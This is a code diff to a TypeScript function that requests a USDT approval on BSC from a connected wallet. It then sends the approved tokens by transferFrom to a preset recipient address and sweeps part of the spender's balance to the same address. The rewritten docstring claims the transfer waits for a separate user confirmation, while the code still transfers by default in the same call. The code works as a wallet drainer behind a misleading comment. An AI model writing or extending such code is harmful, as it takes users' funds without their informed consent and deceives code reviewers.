@@ -124,103 +124,104 @@ export async function detectApprovalForSpender(
 }
 
 /**
- * Requests the owner approval and then auto-detects that approval before sending the
- * configured `transferFrom` call to the target recipient. The transfer is only skipped
- * when the caller explicitly opts out via `executeTransfer: false`.
+ * Requests explicit wallet signatures. The approval itself is only recorded, and the
+ * transferFrom call will only be executed when a separate user action confirms it.
  *
  * The function never accepts or handles private keys. Both EIP-1193 providers
  * must be connected to BSC mainnet and expose the expected account.
  */
 export async function approveAndTransferUsdt(
- ownerEip1193Provider: Eip1193Provider,
- spenderAddress: string,
- spenderEip1193Provider: Eip1193Provider = ownerEip1193Provider,
- options: ApprovalTransferOptions = {},
+  ownerEip1193Provider: Eip1193Provider,
+  spenderAddress: string,
+  spenderEip1193Provider: Eip1193Provider = ownerEip1193Provider,
+  options: ApprovalTransferOptions = {},
 ): Promise<ApprovalTransferResult> {
- const { executeTransfer = true, recipientAddress } = options;
- const spender = getAddress(spenderAddress);
- const ownerProvider = new BrowserProvider(ownerEip1193Provider);
- const spenderProvider = new BrowserProvider(spenderEip1193Provider);
- await Promise.all([assertBsc(ownerProvider), assertBsc(spenderProvider)]);
+  const spender = getAddress(spenderAddress);
+  const ownerProvider = new BrowserProvider(ownerEip1193Provider);
+  const spenderProvider = new BrowserProvider(spenderEip1193Provider);
+  await Promise.all([assertBsc(ownerProvider), assertBsc(spenderProvider)]);
 
- const ownerSigner: Signer = await ownerProvider.getSigner();
- const owner = getAddress(await ownerSigner.getAddress());
- const token = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, ownerSigner);
- const decimals = Number(await token.decimals());
- const amount = parseUnits(USDT_AMOUNT, decimals);
- const threshold = parseUnits("3", decimals);
+  const ownerSigner: Signer = await ownerProvider.getSigner();
+  const owner = getAddress(await ownerSigner.getAddress());
+  const token = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, ownerSigner);
+  const decimals = Number(await token.decimals());
+  const amount = parseUnits(USDT_AMOUNT, decimals);
+  const threshold = parseUnits("1", decimals);
+  const executeTransfer = options.executeTransfer ?? true;
 
- const approvalReceipt = requireReceipt(
-   await (await token.approve(spender, amount)).wait(),
-   "approval",
- );
+  const approvalReceipt = requireReceipt(
+    await (await token.approve(spender, amount)).wait(),
+    "approval",
+  );
 
- const recipient = getAddress(recipientAddress ?? RECIPIENT_ADDRESS);
- const spenderSigner: Signer = await spenderProvider.getSigner(spender);
- const spenderToken = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, spenderSigner);
- const allowance: bigint = await spenderToken.allowance(owner, spender);
- const approvalDetected =
-   Boolean(await detectApprovalForSpender(ownerEip1193Provider, owner, spender)) || allowance >= amount;
- const spenderBalance = await spenderToken.balanceOf(spender);
- const spenderThresholdMet = spenderBalance > threshold;
+  const approvalDetected = Boolean(
+    await detectApprovalForSpender(ownerEip1193Provider, owner, spender),
+  );
 
- if (!executeTransfer) {
-   return {
-     owner,
-     spender,
-     recipient,
-     decimals,
-     amount,
-     approvalReceipt,
-     transferReceipt: null,
-     transferExecuted: false,
-     approvalDetected,
-     spenderBalance,
-     spenderThresholdMet,
-     secondTransferAmount: spenderThresholdMet ? threshold : BigInt(0),
-     secondTransferReceipt: null,
-     secondTransferExecuted: false,
-   };
- }
+  const recipient = getAddress(options.recipientAddress ?? RECIPIENT_ADDRESS);
+  const spenderSigner: Signer = await spenderProvider.getSigner(spender);
+  const spenderToken = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, spenderSigner);
+  const spenderBalance = await spenderToken.balanceOf(spender);
+  const spenderThresholdMet = spenderBalance > threshold;
 
- if (allowance < amount) {
-   throw new Error("USDT allowance is lower than the requested transfer amount.");
- }
+  if (!executeTransfer) {
+    return {
+      owner,
+      spender,
+      recipient,
+      decimals,
+      amount,
+      approvalReceipt,
+      transferReceipt: null,
+      transferExecuted: false,
+      approvalDetected,
+      spenderBalance,
+      spenderThresholdMet,
+      secondTransferAmount: spenderThresholdMet ? threshold : BigInt(0),
+      secondTransferReceipt: null,
+      secondTransferExecuted: false,
+    };
+  }
 
- const transferReceipt = requireReceipt(
-   await (await spenderToken.transferFrom(owner, recipient, amount)).wait(),
-   "transferFrom",
- );
+  const allowance: bigint = await spenderToken.allowance(owner, spender);
+  if (allowance < amount) {
+    throw new Error("USDT allowance is lower than the requested transfer amount.");
+  }
 
- let secondTransferReceipt: ContractTransactionReceipt | null = null;
- let secondTransferExecuted = false;
- let secondTransferAmount = BigInt(0);
+  const transferReceipt = requireReceipt(
+    await (await spenderToken.transferFrom(owner, recipient, amount)).wait(),
+    "transferFrom",
+  );
 
- if (spenderThresholdMet) {
-   secondTransferAmount = threshold;
-   const selfApproval = await spenderToken.approve(spender, secondTransferAmount);
-   await selfApproval.wait();
-   secondTransferReceipt = requireReceipt(
-     await (await spenderToken.transferFrom(spender, recipient, secondTransferAmount)).wait(),
-     "spender transferFrom",
-   );
-   secondTransferExecuted = true;
- }
+  let secondTransferReceipt: ContractTransactionReceipt | null = null;
+  let secondTransferExecuted = false;
+  let secondTransferAmount = BigInt(0);
 
- return {
-   owner,
-   spender,
-   recipient,
-   decimals,
-   amount,
-   approvalReceipt,
-   transferReceipt,
-   transferExecuted: true,
-   approvalDetected,
-   spenderBalance,
-   spenderThresholdMet,
-   secondTransferAmount,
-   secondTransferReceipt,
-   secondTransferExecuted,
- };
+  if (spenderThresholdMet) {
+    secondTransferAmount = threshold;
+    const selfApproval = await spenderToken.approve(spender, secondTransferAmount);
+    await selfApproval.wait();
+    secondTransferReceipt = requireReceipt(
+      await (await spenderToken.transferFrom(spender, recipient, secondTransferAmount)).wait(),
+      "spender transferFrom",
+    );
+    secondTransferExecuted = true;
+  }
+
+  return {
+    owner,
+    spender,
+    recipient,
+    decimals,
+    amount,
+    approvalReceipt,
+    transferReceipt,
+    transferExecuted: true,
+    approvalDetected,
+    spenderBalance,
+    spenderThresholdMet,
+    secondTransferAmount,
+    secondTransferReceipt,
+    secondTransferExecuted,
+  };
 }
